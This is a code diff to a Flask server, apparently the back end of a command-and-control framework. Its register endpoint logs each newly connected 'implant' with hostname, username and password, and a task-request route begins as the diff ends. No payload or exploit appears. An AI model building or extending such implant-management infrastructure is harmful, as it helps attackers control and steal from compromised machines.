@@ -4,8 +4,9 @@ from flask import Blueprint, request , abort
 from cvnt.implant_pb2 import * 
 from cvnt.database import db
 from cvnt.models import *
-
 from flask_wtf.csrf import *
+
+from constants import *
 
 rpc = Blueprint("rpc", __name__)
 
@@ -13,15 +14,15 @@ password = "password"
 
 @rpc.route("/register", methods=["POST"])
 def handle_register():
-    print(f'REGISTERING A NEW IMPLANT')
-    register = RegisterImplant()
     reg_data = request.get_data()
-    print(reg_data)
+    
+    register = RegisterImplant()
     register.ParseFromString(reg_data)
-    print(register.GUID)
-    print(register.Hostname)
-    print(register.Username)
-    print(register.Password)
+    print(f'[+] New Implant:')
+    print(f'[+]    * GUID: {register.GUID}')
+    print(f'[+]    * Hostname: {register.Hostname}')
+    print(f'[+]    * Username: {register.Username}')
+    print(f'[+]    * Password: {register.Password}')
     '''
     if register.Password != password:
         abort(404)
@@ -30,8 +31,8 @@ def handle_register():
     db.session.add(r)
     db.commit()
     '''
-    print("Watch out sexy ;) a New Implant connected!")
-    return "Success\n."
+    print("[+] Watch out sexy ;) a New Implant connected!")
+    return REGISTRATION_SUCCESSFUL
 
 @rpc.route("/task/request", methods=["POST"])
 def send_task():
